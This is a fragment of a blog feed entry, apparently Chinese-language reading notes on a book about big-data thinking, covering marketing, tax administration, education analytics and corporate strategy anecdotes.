&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc7bf37f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc7bf37f&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.4&lt;/span&gt; 选定思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;你了解你的客户吗？你能分清你的客户群体中哪些是可以长久合作、哪些只是暂时短期的利益相互关系吗？你的营销和广告投入应该针对哪类客户群体，你都清楚吗？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;企业想要做到正确的定位客户，首先就必须先设定目标。&lt;/li&gt;
&lt;li&gt;找到有价值的客户并不代表着就一定能够进行合作。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;“建立品牌”&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org805da29&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org805da29&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;8&lt;/span&gt; 教育、教学正在大数据化&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-8&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3e00e05&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3e00e05&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.1&lt;/span&gt; 院校思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据”时代，如何推动和创新院校教育模式
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;区别：传统数据的整理方式能凸显学生整体的专业水平或整体素质、身体的发育状况、社会性情绪及适应性的发展，还有对学校的满意程度等。而大数据就不一样了，它具备的分析能力更广、更细腻。它可以去关注每一个学生的微观表现，比如，在考试时，他在一道题上逗留了多久；在不同学科课堂上，他开小差的次数是多少；在食堂吃饭，他喜欢吃什么，不喜欢吃什么；每个学生的出生日期，包括喜欢的颜色等。&lt;/li&gt;
&lt;li&gt;这些数据对其他个体没有意义，但所有学生的数据整合起来对大数据分析就有价值了。比如旷课、纪律或课堂表现等预测模式，教育者就可以确认哪些学生退学的可能性较高。通过利用大数据来观察并分析对学生在课堂中点滴的表现，大数据帮助我们可以了解学生对知识的掌握程度以及感兴趣程度，进而让学校反思自己的教学模式是不是满足了学生的需求。有了大数据以后，教育工作者们就可以针对不同的学生进行不同的教育模式，从而真正做到因材施教和以人为本。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;传统的院校决策模式总结为四种：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一种是通过“合意”的过程来平衡大学内多方群体利益的“学院型”模式；&lt;/li&gt;
&lt;li&gt;第二种是通过“扩散”程序表达不同权力集团、利益群体诉求的“政治型”模式；&lt;/li&gt;
&lt;li&gt;第三种是决策程序无章可循、随意性大的“有组织无政府型”模式；&lt;/li&gt;
&lt;li&gt;第四种是依靠决策者所具有的理性认知能力制定决策的“官僚主义”模式。&lt;/li&gt;
&lt;li&gt;这四种模式的共同弱点在于缺少有力的决策支持依据，管理者实际上是以“有限理性”为基础，努力做出“足够好”的决策。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;在大数据背景下的院校决策，可以为教育决策者提供和完善认知经验所缺乏的信息、知识和智慧。针对这样的情况，有学者将其称为以数据系统为支撑的“知会理性”决策模式。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org497039c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org497039c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.2&lt;/span&gt; 教学思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据变革教育的第一波浪潮
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;翻转课堂是未来教育的课堂模式。采取让学生在上课前先学习教学视频，在课堂上完成作业或做实验的方式，而老师则在学生遇到学习困难时给予帮助，对他们进行一对一的个性化指导。&lt;/li&gt;
&lt;li&gt;MOOC风暴来袭，放大翻转课堂效应。&lt;/li&gt;
&lt;li&gt;微课程兴起：回应翻转课堂和MOOC浪潮。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd6ee001&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd6ee001&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.3&lt;/span&gt; 教育思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据时代”以不可挡的势头扑面而来，给教育界的人敲响了警钟，告诉他们：“原始”的教育方式已经成为过去，“新时代”已经袭来。&lt;/li&gt;
&lt;li&gt;“大数据”并不是一种技术的时尚潮流，而是在信息技术高度发展之后，人们如何开发利用数据为新的商业模式发展奠定基础的过程。与此同时，也是一种基于新工具解决问题的全新思路。&lt;/li&gt;
&lt;li&gt;“大数据”怎么样改变传统的教育？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面是改变教育研究中对数据价值的认识；&lt;/li&gt;
&lt;li&gt;第二个方面是方便校长、教师更全面了解每一个学生；&lt;/li&gt;
&lt;li&gt;第三个方面是帮助学生进行个性化高效学习。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>杨倩</name></author><category term="Big-Data" /><category term="大数据" /><summary type="html">致胜大数据时代的50种思维方法 If you have questions, please send email to zrg1390556487@gmail.com. 1 前言 1.1 什么是大数据 最早提出“大数据”时代来临的是全球知名的咨询公司麦肯锡。“数据已经渗透到每一个行业和业务领域，成为重要的组成部分之一。人们对于海量数据的挖掘和运用，预示着新一波生产率增长和消费者盈余浪潮的到来。” 2008年9月，《自然》杂志推出了封面专栏——“大数据”，内容讲述了数据在生物、物理、工程、数学及社会经济等多方面学科所占据的位置和角色的重要性。 哈佛大学-社会学教授-加里·金说：“这是一场革命，庞大的数据资源使得各个领域开始了量化进程。无论学术界、商界还是政府，所有领域都将开始这种进程。” “大数据”，英文为&quot;Big Dat，，&quot;简单来说，“大数据”是一种巨量资料库，可以在合理时间内达到撷取、管理、处理并整理为帮助公司、企业经营和决策的资讯信息。 业界将“大数据”概括成四个V，即大量化(Volume)、多样化(Variety)、快速化(Velocity)和价值化(Value)。 大数据的信息量有多大？ 截止到2012年，数据量已经从TB级别跃升到PB、EB乃至ZB级别。（1024GB=1TB，1024TB=1PB，102**B=1EB，1024EB=1ZB）。 2008年，全球产生的数据量为0.49ZB；2009年的数据量为0.8ZB；2010年的数据量为1.2ZB；2011年的数据量更是持续增长，竟高达1.82ZB。这个数据量，相当于全世界的每个人产生200GB以上的数据。 IBM公司称，截止到2013年10月，全世界所获得的数据中，有90%都是过去两年内产生的。预计到2020年时，全世界所产生的数据规模将达到今天的44倍。 “大数据”不仅是量大而已，它还具有多样化、快速化、价值化等优势。 截止到2012年10月，大数据所形成的市场规模在51亿美元左右。到了2017年，此数据预计会上涨到530亿美元。 1.2 改变思维模式，用数据说话 来举一个简单的例子：苹果公司创始人史蒂夫·乔布斯在罹患癌症后，不惜花费巨额抽取了全身的DNA信息。这样一来，医生就可以根据他全身的DNA信息来判断癌细胞的变化，从而对症下药。然而，对于普通的患者来说，是拿不出巨额钱款来做这种抽取检测的。换句话说，医生只能从普通患者身上提取很小的一部分DNA信息。两者的治疗效果有多大差异，可想而知。 再来举个简单的例子：如果你上淘宝，登录支付宝账户，点开电子对账单，你是不是能够看到自己一年的消费曲线图？是不是能够看到每个月的支出和收入？是不是能够看到自己的钱花到哪里去了？是不是比拿笔记账清晰和准确得多？根据网络购物的数据中，你还会发现：哪个城市的男人比女人购买的东西还要多；哪个城市的人用支付宝缴纳水电费的频率最高；什么星座的男性或女性在某年的消费额最高；在一年里，在父母或亲友身上花费了多少；节假日时，什么东西最畅销…… 大数据专家维克托·迈尔-舍恩伯格在《大数据时代》中是这样解释的：云计算在获取海量数据的同时，也带来了数据的混杂性，这会给传统的数据分析带来一些困扰。在以往，我们习惯于由数据得出具体结果。而在大数据时代，我们应当关注的是数据之间的相关关系，而不是数据之间的因果关系。 数据之间的相关关系可以帮助我们捕捉现在的线索和预测未来。如A和B的情况经常一起发生，那么只要注意到B情况发生，就能预测A的情况是怎么样的。这种“A和B”的关系在零售行业和IT行业中已被广泛运用。7-11便利店通过分析零售终端的数据，得出了这样的一个相关关系—温度低于15摄氏度，暖宝宝的销售量便增加5%。于是，只要温度低于这一度数，7-11便利店内的暖宝宝就会上架；豆瓣电台会推荐一些你可能会喜欢的音乐；当你在当当网买某本书后，系统就会提醒你—购买这本书的人中，有30%也购买了另外一本书…… 2 大数据是一场革命 2.1 定律思维 此前，在大数据中，有两个较为突出的定律：一秒定律或秒级定律和摩尔定律。 什么叫一秒定律或秒级定律？指的是对处理速度有要求，一般要在秒级时间给出准确的分析结果。 什么叫摩尔定律？ 指的是简单地评估出半导体技术进展的经验法则，其重要的意义是对于长期来说的，IC制程技术是以一直线的方式向前推展，使得IC产品能持续降低成本，增加功能和提升性能。 大数据时代，人们更要重视统计学。为什么要强调统计学呢？那是因为人们在认知能力中，统计思维算是最差劲的。要知道，人的大脑中有一些功能比较优良，甚至超过人们自身的想象，比如人们的语言能力。 举个例子：当一个人在深夜行走时，会敏锐地察觉到周边的变化。一旦感受到危险或不安的情绪时，就会立即逃跑，甚至大喊大叫。而与此同时，人的大脑之中还有另外一套操作系统，是用来做逻辑推理以及进行统计分析的，只是这个系统不怎么完善。于是，人们天生就缺乏逻辑推理能力和统计思维能力。 为什么大数据变成了一个最热门的词汇？主要的原因有两个。 第一个原因是，由于IT革命后，人们有了处理数据的多方面能力，有对计算机数据的处理能力、对计算机的存储能力以及对计算机的计算的能力，等等。再加上，人类储存信息量的增长速度要比世界经济增长的速度快四倍（这仅仅是在金融危机爆发之前的世界经济增长的速度）。而计算机数据处理能力的增长速度，要比世界经济增长的速度快九倍。 第二个原因是，社会上的一切现象以及企业的发展，能够被数据化的东西越来越多。 社科院世界经济与政治研究所副所长何帆总结出了大数据的三个规律： 第一个规律是知其然而不必知其所以然，外行打败内行； 第二个规律是彻底的价格歧视，商家比你更了解你自己； 第三个规律是打破专家的信息优势，病人给医生解惑。 2.2 集合思维 如果把毫不相干或紧密相连的数据组合到一个集合中，就能更有效地处理这些相关的数据。这些数据可以清晰地告诉我们：每一个客户的消费观念、倾向、爱好、需求等，哪些可以归为一类，哪些可以归为另一类。 大数据的集合是数据数量上的增加，能够实现从量变到质变的过程。 大数据的基本结构还分为三个层次，反映出观察数据库的不同角度。 第一层是物理数据层：是数据库最里面的一层，是物理存贮设备上实际存储的数据的集合。这些数据是最原始数据，也是供用户加工的对象。物理数据层由内部模式描述的指令操作处理的位串、字符和字组合而成。 第二层是概念数据层：是数据库置于中间的一层，也是数据库的整体逻辑的部分。这层数据层指出了数据与数据之间的逻辑定义和联系，是存贮资料的整合点。此时要注意的是，这层数据层所涉及的是数据库所有对象的逻辑关系，而不是其物理情况。 第三层是逻辑数据层：是体验用户能够看到和使用的数据库，也是能够证明用户使用过的证明和踪迹。 总之，小数据，大集合就是按照某种数据集中起来并存放二级存储器中的一种方式。这种数据集合还有着一定的特点，比如尽量不出现重复的情况。 2.3 创新思维 首先，大数据的创新思维可以推动并实现巨大的经济效益。 其次，大数据的创新思维可以增强社会管理水平。 最后，大数据所具备的创新思维还可以推动和提高安全保障能力。 2.4 转型思维 以广东省地税系统为例子，从几大方面来揭示大数据推动公共管理从传统向现代转型的趋势。 第一个方面就是：从粗放化向精细化转型。通过建立省级数据应用大集中征管信息系统，广东地税摆脱了以往人工操作的粗放型管理模式，真正实现了税款自动入库、自动划解和实时监控，实现了税款的稳定增长以及快速增长。再通过对海量信息的详细分析和研究，广东省对每一个商家或是企业都实现了精细化转型。比如说，在房地产方面，由于建筑行业的人员流动性大，操作的环节复杂，且没有规范性，就形成了一个比较难管的问题。但自从有了这个征管系统以后，大数据就能够实时获取房地产开发项目明细信息，其中包括土地使用权信息、房产销售进度、销售明细建筑工程进度以及各阶段的税款缴纳情况等，实现了项目从产生到消亡的全过程监控。 第二个方面就是：从单兵作战型向协作共享型转型。在以往，不同政府部门拥有着不同的信息系统，但很多数据由于相互独立，所以彼此之间没有共享的信息，这些信息单独拿出去，就没有了任何用处。而大数据应用的出现，就扫除了这个盲点，使其实现了数据信息的共享，从而最大限度地发挥了数据的功效。如今，工商、税务等系统每天都会进行信息实时交换，推动了地税机关在办证服务上的创新，从原来的限时办证，实现了目前的即时办证；从原来填写一百多项登记信息，实现了目前只填写八项必要信息内容，甚至实现了享受免填服务。不仅如此，广东省地税借助大数据平台，积极推进第三方涉税信息共享，还明确了二十多个部门共享信息，真正做到了为每个部门提供便利，为社会经济的发展也提供了更快捷、更便利的服务。 第三个方面就是：从柜台式向自助式全天候转型。根据纳税人的不同类别、涉税业务的不同、办理时段不同等信息，广东地税借助大数据平台，形成了自助式全天候的一种转型。比如，增添了很多服务格局—网上办税、纳税热线、服务大厅、短信服务、自助办税等多种渠道并存的大服务格局。通过自助办税终端系统，为纳税人节时省力，不仅不受地方区域的限制，也可以不受时间的限制，自行完成代开小额发票、打印缴款凭证、清缴税费、申报缴纳车船税等业务。 第四个方面就是：从被动响应型向主动预见型转型。为了能够更好地服务纳税人，广东省地税通过税收大数据平台，还推出了一项特别的服务，那就是全省集中统一的短信服务。这项服务会为六百多万的纳税人提供短信订阅服务，有针对性地对目标群体提供了多项短信服务，如逾期未申报短信提醒、未到期未申报短信提醒，还有发票开具短信提醒等。借助于大数据平台，广东省地税实现了对受众精确式的短信服务，避免了轰炸式、盲目性的短信服务，从而提升了服务质量。据统计称：截止到2011年，短信服务量超过1800万条；到了2012年，短信服务量已经超过5000万条。 第五个方面就是：从纸质文书向电子政务转型。现如今，广东省地税互联网电子税务局已基本建成，纳税人只需要短短的五分钟，就能轻松办税，而且还实现了网上缴纳，足不出户。此外，广东省还率先推行网络开具发票，一方面为纳税人提供了方便，节省了时间。一方面使税务机关能在第一时间掌握每张发票的信息，与企业纳税申报数据比对分析，及时总结出没有缴纳、少缴纳的税款情况。这一行动推广以后，还意外地打击了假发票泛滥的情况，也避免了一些人用假发票报销的现象。也因此，这一措施被国家税务总局誉为“税收管理史上的颠覆性举措”。 第六个方面就是：从风险隐蔽型向风险防范型转型。依托大数据平台，广东省地税建立了惩防体系信息管理系统，对地税干部的税收执法和行政管理实行了全程分析和监控，有效监督和杜绝了一些知法犯法和影响国家荣誉的风险出现。监控预警信息从最初每月收到近7000个，到2012年每月收到不足500个，下降了92%。可以说，自从大数据监控平台出现后，全系统违法违纪发案率大幅度降低，不足5‰，也没有什么重大的违纪案件出现，这就是最大的成功！ 2.5 战略思维 未来，大数据相关的技术和能力将成为一个国家至关重要的核心战略资源。 2012年3月，美国总统***政府宣布推出一项发展计划——“大数据的研究和发展计划”。 2013年2月，法国政府发布了一项关于《数字化路线图》的技术措施，列出了五项将会大力支持的战略性高新技术，“大数据”位列其中。在这项措施中，法国政府将以软件制造商、工程师、新兴企业、信息系统设计师等为目标，开展一系列投资计划，旨在通过创新型和科学性的解决方案，将大数据运用到实际生活中。 2012年9月，日本总务省也发布了一项行动计划，提出“通过大数据和开放数据开创新市场”，以复苏日本为目的推进“活跃在ICT领域的日本”ICT综合战。 大数据的价值主要体现在三个方面。 第一个方面，是能够实现巨大的商业价值。 第二个方面是能够增强社会管理水平。 第三个方面是能够提高安全保障能力。 3 应对传统模式的大数据思维 3.1 扩散思维 为了更好地分析大数据之间的关联性和扩散性，Facebook使用了HBase。HBase是Apache（世界使用排名第一的Web服务器软件）的另外一款产品，使用了独特定义的一组表格。HBase可以像Hadoop（一个分布式系统基础架构，由Apache基金会所开发）一样执行大数据处理产品的能力，以更迅速、更精细的方式来分析数据之间的连接。 以北京的交通为例子。北京有一个交通智能化分析平台，其数据通过分析源自路网摄像头、传感器、轨道交通、旅游、地面公交、出租车、客运等行业方方面面的数据，得出了这样的一个结果：高速ETC数据每天50万条；4万辆的浮动车每天会产生近2000万条记录；出租车运营为数据为每天100万条；交通卡刷卡的记录为每天1900万条；手机定位数据为每天1800万条……此外，还计算出了北京的人均上班平均用时为52分钟，全国平均人均上班用时39分钟。这些海量的数据，在体量和产生速度上都对存储和处理能力提出了非常高的要求。 3.2 颠覆思维 在大数据时代，创新和转变思维就意味着进步，意味着发展。而传统的、守旧的思维已经不适用于这个时代。因此，转变思维是大数据时代的必然趋势。 移动说，搞了这么多年，今年才发现，腾讯才是我们的竞争对手。一个小小的微信软件运用，给了电话和短信致命性的一击！ 国内最大的免费安全平台360互联网安全中心能够颠覆传统杀毒软件市场，成为No.1。 诸多残酷的现实告诉我们：如果还停留在过去，不懂得转变，那只能被大数据时代淘汰！ 3.3 量变思维 信息总量的变化导致了信息形态的变化，也就是量变引发了质变。大数据也一样，量变导致质变。 计算机数据处理能力的增长速度非常快，快得令人咂舌。这个速度比世界经济的增长速度还要快九倍； 人类存储信息量的增长也迅速增长，比世界经济的增长快四倍； 曾经，欧洲的信息存储量用了50年才增长了一倍，如今每三年就能增长一倍。 在金融领域，美国股市每天的成交量高达70亿股，Facebook每天更新的照片量超过1000万张，每天，人们会在网站上点击“喜欢”按钮或写评论约30亿次，谷歌公司每天要处理超过24拍字节的数据。 3.4 优劣思维 事物都是一分为二的，有优势，也有劣势，大数据也是如此。 大数据的劣势。 首先，大数据存在隐私泄露的情况。 其次，大数据只能发现过去，不能左右未来。 3.5 冲击思维 大数据的冲击力体现在哪些具体方面： 第一个方面，大数据正在以无限的增长方式突破有限的增长。 第二个方面，大数据正在以效益递增突破。 第三个方面，大数据是和谐共赢的，它突破了对立和矛盾的发展。 互联网的时代，你需要互联网思维，当然不是那种越来越“玄”的互联网思维，而是一种回归常识的互联网思维。 4 新数据时代的新思维 4.1 幂律思维 幂律是大数据所遵循的基本定理，什么是幂律？它指的是几何平均定值，如有一万个连线的大节点有十个，有一千个连线的中节点有一百个，一百个连线的小节点有一千个……在对数坐标上画出来会得到一条斜向下的直线。 幂律和爆发点的相伴相生 爆发改变了一切 4.2 效率思维 大数据的精准和效率 大数据能掌控电视剧收视率 大数据还能追女朋友 4.3 邮件思维 邮件思维是什么？是在用户默许的情况下，通过电子邮件的方式向用户传递有价值信息的一种营销手段。营销手段是利用邮件与用户、客户进行商业交流的一种直销方式。 会员才是邮件营销的核心，与传统的纸质邮件相比，邮件营销更高效、更快捷。 大数据时代的邮件营销 邮件营销最注重的是数据信息的收集和整合，各行各业都希望用“短平快”的方式，直接购买邮件地址，不断地给用户或客户发送营销邮件，从而明确目标群，获得订单。但这种营销的效果越来越不明显。 由于多年来在邮件营销领域的经验和积累，webpower获得了海量的用户数据信息。通过对这些数据的分析和整理，webpower将为客户带来昂贵的价值。在大数据技术的支持和帮助下，webpower可以针对用户点击的内容进行深入分析和挖掘，为其制定个性化的邮件策略。此外，webpower还可以对用户使用邮箱的历史数据，设定为触发式邮件。在必要的时候，可以启用短信、微信等参与进来，提醒用户哪些是有价值的营销邮件。 邮件营销与网络营销、数据库营销以及新媒体等的结合越来越紧密。如何提升邮件营销给企业带来更大的价值，是IT行业急需探索的问题。 4.4 定位思维 网站零售在挖掘顾客喜好时运用了两种方式。 第一种方式是从消费者的购买行为上来判断他们之间相同的地方。比如，当你在网上买电子产品时，网站就会跳出对话框或在网页下端提醒你—购买这款电子产品的人也购买了其他哪些电子产品。就是这样，网站零售商找到了“人以群分”的结合点。 第二种方式是从商品上入手，网络零售商通过判断商品之间的关联性推荐给消费者。比如，你想要买一件裤装，网站就会推荐一款T恤或衬衫，从而找到“物以类聚”的结合点。 余额宝的成功，最重要的就是定位准确。天弘基金副总经理，增利宝余额宝项目组组长周晓明此前曾表示：“小公司走老路，干是找死，不干是等死。穷则思变，中小公司一定要创新。” 4.5 逆向思维 股神巴菲特有这样的一句名言：别人贪婪时我恐惧，别人恐惧时我贪婪。换句话理解，就是人们需要有一种逆向思维，这也是对创新的另一种理解。 IBM公司曾经是世界上最大的计算机公司，也曾是世界上经济效益最好的计算机公司。1985年，IBM公司的通用大型机毛利率高达85%，中小型机毛利率高达50%，占世界通用大中型计算机市场的70%。到了20世纪80年代后期开始，计算机开始向小型化的个人电脑发展。到了1993年，IBM公司连续亏损，亏损的金额高达168亿美元。为了集中精力进行硬件开发，IBM公司就把个人电脑的操作系统授权给了微软公司。随着IBM个人电脑兼容机的大规模普及，微软和英特尔占据了个人电脑产业系统的核心位置，而IBM硬件则逐渐被边缘化了。 苹果公司运用逆向思维，另辟蹊径，用一种全新的方式建立了新的产业形态，撼动了微软和英特尔的领导地位。 逆向思维运用得好，就会将缺点变成优点，把不可能变成可能。 纵观这些企业之间的竞争和案例，无不告诉我们这样一个道理：“当你面对强手的时候，千万不要被对方牵着鼻子走，而是寻找到自己的节奏，迈出适合自己的步伐，脚踏实地，并懂得“想他人所想不到，做他人所做不到”。 5 大数据能量的积累与爆发 5.1 关联思维 从数据中寻找出一定的相关关系，通过这种关系，大数据会做出预测，从而告诉大众结果。这就是大数据方法论的核心思想。 麻省理工学院气象学家洛伦兹曾向人们介绍过一种现象—“蝴蝶效应”。 一只南美洲亚马孙河流域热带雨林中的蝴蝶，偶尔扇动几下翅膀，两周后，美国得克萨斯州掀起了一场龙卷风。从表面上看来，似乎这之间毫无关系，但结果告诉我们，即使是微小的事情也极有可能与千里之外的一件事情发生关联，并带来改变。 5.2 双刃思维 “大数据时代”的隐患：只要你在网络上活动，无论你在做些什么，都会被“记录在案”，甚至不知在什么地方，又以哪种形式被人揪出来。更可悲的是，你想不想出来的主动权不是由自己说了算，而是由网络运营商来决定。 “大数据”是一把双刃剑，人们在享受大数据带来的机遇时，也不得不面临一个残酷的问题，以及可能爆发的大数据危机。 5.3 价值思维 “大数据”真的那么具有吸引力吗？ 网络用户每点击一次鼠标，每一次刷卡消费，都已经参与了数据的生成。可以说，每一个用户都是数字的生产者和消费者。 凭借如此精细的监测手段，完全可以知道一个人或一辆车的行踪，从而产生精细化的数据，用以描述各种物体、社会和整个环境的行为。有了这些数据，大大减少了社会的复杂度。 在商业领域，一家美国的公司已经利用大数据，在亚马逊的云平台上处理跟天气相关的信息，从而帮助农业种植者保障自己的收益。对企业数据信息的深度挖掘和分析，能够对经济运行的状况进行准确的预警，从而做出正确的应对决策。 在金融领域方面，大数据分析师都已经成为在美国华尔街基金股票分析和高频数据交易等领域最抢手的人才；在中国，阿里巴巴集团旗下的金融业务，也开始用大数据来发放“信用贷款”。 大数据时代带来了比以往机会更大的发展空间。这包括以下几个方面： 第一个方面，是技术创新的新空间。 第二个方面是商业模式的创新。 第三个方面是信息资产的经营。 第四个方面是客户关系管理。 第五个方面是个性化精准推荐。 6 大数据引导的商业变革 6.1 知识思维 “核心竞争力”这一理念，是由美国学者普拉哈德和哈默提出的。他们把其定义为：组织中的积累性学识，特别是关于如何协调不同的生产技能和有机结合多种技术流派的学识。 大数据的核心是思想，不是技术。 端到端是一个面向大数据的解决方案。英特尔的理念是在这个解决方案里实现数据价值的挖掘。所谓“端到端”，前端视频采集、分析、存储，及后端数据中心处理等。 总而言之，知识经济才是提高核心竞争力的有效途径。 首先，知识经济时代可以识别企业核心知识，并提高企业的创新能力。 其次，信息化建设可以使知识管理更有效地进行，提高企业的核心竞争力。 6.2 变革思维 大数据的价值不言而喻，但也有着两面性。 大数据催生了一批新型科技公司，吸纳科技人才就业，并为企业发展转型提供了新机遇； 另外一方面，大数据给个人、企业乃至国家带来了一些危机，如隐私、重构信息安全、竞争力差距拉大以及数据产权争端等问题。 大数据改变了人们的生活，塑造出了不同的个性化思维。 比如，人们白天在电脑前浏览网页或下个订单，第二天就能收到自己想要的东西；晚上出门消费，不再是给现金，而是刷卡；看电影也不再苦苦排队，而是提前团购或预订……由此，人们的行为举止都会被记录下来，从而产生数据 再比如，气候公司会根据各个城市的气温高低、降雨量、土壤的状况和往年的农作物产量等情况，预测出第二年农场的产量，甚至还向农户出售个性化保险； 阿里巴巴集团根据在淘宝网上中小企业的交易状况，筛选出财务健康和讲究诚信的企业，为其发放无须担保的贷款。 再举个例子：我们得到了一个人的短信和通话数据、他微博的内容数据、医保和社保的数据，还有城市交通数据、签到数据、社交关系数据等。通过这些数据，我们就能对这个人形成深刻的认识，从而为其打造出完全个性化的服务。 百度大数据关于技术方面的事例 百度大数据开放平台 百度工业革命 6.3 生产思维 人类的行为是否可以被预测？ 如何运用“私人定制”思维？ 大数据“定制化”需得具备几个条件： 首先，要有海量的数据； 其次，这些数据能够挖掘出对生产商家有价值的信息； 再次，具备挖掘这样的数据的技术能力； 最后，要有能力整合生产、流通和销售这些关键环节。 6.4 自动化思维 关于信息安全，大数据作出的最大贡献就是通过自动化分析处理与深度挖掘，将亡羊补牢式的处理，转向还没有发生前的自动化评估预测和应急措施。 大数据解析航空安防和自动化 首先，从目前来说，飞机是地球上最安全的旅行交通工具，比其他交通工具，如汽车、火车等安全级别高很多。 其次，飞机发生事故所造成的社会影响比其他交通工具发生事故造成的社会影响更大。 再次，国外的一些专家经过研究得出了一个结论，那就是：国际航班比国内航班出事故的概率要低一些。其实并非如此，所有国家的航班出现事故的概率都相差无几，并不是发达国家的国际航班就更安全一些。 最后，飞行过程中的安全概率是根据起飞和爬升到巡航高度，以及下降和着陆来决定的。当然了，这也是飞行中最容易出问题的地方。 6.5 导向思维 新生的婴儿在第一时间就得学会哭泣；上学时，坐进教室的第一时间就得知道上什么课，拿什么书；进入高中后，必须规划今后的人生，上什么学、学什么专业、找什么样的姑娘或嫁什么样的男人，从事什么工作……这些，都需要一个导向思维，如果仅仅靠得过且过，明天的事明天说，犹如行尸走肉一般，一生将无建树。当然，绝大多数的人们，不会甘于现状，苛求发展，即使没有真正发展，也在内心存在这样的渴望，并独自努力。 有了导向思维后，一切才会有规律地发展和进步，无论成功与否，其占据的位置都是其他特长所无法替代的。就好比当下就很火爆的阿里巴巴集团旗下的淘宝、天猫等，如果不是因马云的导向思维，怎么会有今天的互联网地位？ 马云的故事 “作为一个创业者，首先要给自己一个梦想。1995年我偶然有一次机会到了美国，然后我看见了、发现了互联网。我对技术几乎不懂，到目前为止，我对电脑的认识还是部分停留在收发邮件和浏览页面上。但是这并不重要，重要的是你到底有什么梦想。” 在创业前，马云已经不缺钱了，至少是不缺吃饭的钱。在那个年代，马云是一名外语教师，还开了一间翻译社，又做夜校老师，有多个渠道的收入来源。用今天的话来说，马云已经脱离了蚁族和蜗居的时代，完全是不愁吃喝的公务员的待遇。但是，有了如此安逸闲适的生活之后，马云为何还要出来创业呢？因为，他想要的并不是这些，而是梦想，一个伟大的梦想。 每个人都会说，我想要环球世界，我想要改变世界，我要让每一个人知道我的存在，为我的成功喝彩。可今天一过，继续过着朝九晚五的生活，在论坛或好友群吐槽工作的不易、上司不懂慧眼识英雄，闲时睡大觉、打游戏、三五好友瞎侃……如果你永远这样，那么你的导向思维没有起到任何作用，而仅仅是一个想法。 IBM大数据战略导向认知计算 2014年3月，在IBM公司大数据新闻发布会上，IBM大中华区大数据和分析及新市场总经理，全球企业咨询服务部合伙人Jason Kelley宣布：“2014年，IBM大数据战略将持续升级在大数据方向的投入。IBM将继续深入在金融、电信、医疗、零售、制造等各行业的实践；并增强大数据与分析与云计算、移动、社交等热点趋势的融合，以及实现认知分析与大数据应用的不断融合。” IBM大中华区大数据中心总监王晓梅说：“在未来的大数据与分析实践中，IBM将进一步帮助企业把分析注入关键业务流程，从‘六大要务’角度解析业务需求，并导出对应的大数据与分析战略蓝图。当前，我们将重点推行该六大要务中对于客户洞察和流程革新的指导，帮助企业通过使用社交媒体分析等进行客户关系管理、市场营销决策，通过利用预测性维护、实时预警等进行财务等运营流程的优化。” 从2005至今，IBM公司并购了35家以上的公司，比如，高速文件传输工具Aspera、IBM收购数据分析软件公司The Now Factory和备受关注的DaaS供应商Cloudant。综上所述，没有导向思维，就没有前进的动力和方向。没有大数据导向思维，就没有成功的可能性。 7 大数据的营销策略 7.1 测量思维 在进行大数据测试之前，首先要对测试需求做清晰的分析。 举个例子：假设一个本科院校的学籍管理系统主要是用来管理学生的，学生在系统中的生命周期一般是四年。根据学校现有的在校生数和五年内的每一年的招生数据，就可以分析出需要构造的各个学年下的学生数。接着，对测试需求做准确清晰的分析后，对输入的测试数据进行分析。 要求主要表现在两方面：一方面要求测试数据与生产环境数据一致。另一方面，就要求测试数据输入要满足输入限制规则，尽量覆盖到满足规则的不同类型的数据。 问题探讨：到底是什么影响人们的幸福感呢？ 随着物质生活水平的提高，生活质量越来越得到人们的重视，而且，社会的总体心态与人们的行为准则有着密不可分的联系。一些社会指标告诉人们：最容易产生负面情绪的人群，不一定是生活最困难的人群，而是期望值与自身生活水平差距较大的人群。 